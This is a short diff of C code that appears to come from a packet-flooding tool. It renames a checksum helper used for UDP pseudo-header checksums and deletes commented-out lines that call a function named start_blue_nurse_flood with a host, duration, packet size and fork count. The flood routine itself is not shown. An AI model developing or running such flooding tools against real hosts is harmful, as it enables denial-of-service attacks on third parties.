@@ -73,7 +73,7 @@ uint16_t checksum_generic(uint16_t *addr, uint32_t count)
     return ~sum;
 }
 
-unsigned short csum(unsigned short *buf, int count)
+unsigned short _csum(unsigned short *buf, int count)
 {
     register unsigned long sum = 0;
     while (count > 1)
@@ -140,7 +140,7 @@ unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph)
     unsigned short *udp = malloc(totaltudp_len);
     memcpy((unsigned char *)udp, &pseudohead, sizeof(struct udp_pseudo));
     memcpy((unsigned char *)udp + sizeof(struct udp_pseudo), (unsigned char *)udph, sizeof(struct udphdr));
-    unsigned short output = csum(udp, totaltudp_len);
+    unsigned short output = _csum(udp, totaltudp_len);
     free(udp);
     return output;
 }
@@ -401,11 +401,3 @@ void start_blue_nurse_flood(char *host, int seconds, int psize, int forks)
 #endif
 }
 
-// char *host = argv[1];
-//     int time = atoi(argv[2]);
-//     int psize = atoi(argv[3]);
-//     int forks = atoi(argv[4]);
-//
-//     // Call the function to start the flooding process
-//     start_blue_nurse_flood(host, time, psize, forks);
-//
